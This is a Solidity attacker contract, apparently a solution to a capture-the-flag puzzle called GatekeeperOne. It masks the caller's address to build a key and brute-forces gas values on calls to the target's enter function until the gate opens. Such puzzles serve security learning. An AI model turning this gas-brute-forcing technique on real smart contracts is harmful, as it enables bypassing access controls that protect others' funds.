// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IGatekeeperOne {
    function enter(bytes8) external returns (bool);
}

contract GatekeeperOneAttacker {
    event CRACK(uint256 gasval);
    IGatekeeperOne target;

    constructor(address _targetAddress) public {
        target = IGatekeeperOne(_targetAddress);
    }

    function attack(uint256 _gaslow, uint256 _gashigh) public {
        bytes8 key = bytes8(uint64(msg.sender) & 0xFFFFFFFF0000FFFF);
        for (uint256 gasval = _gaslow; gasval < _gashigh; gasval++) {
            (bool success, ) = address(target).call{gas: gasval}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );
            if (success) {
                emit CRACK(gasval);
                break;
            }
        }
    }
}
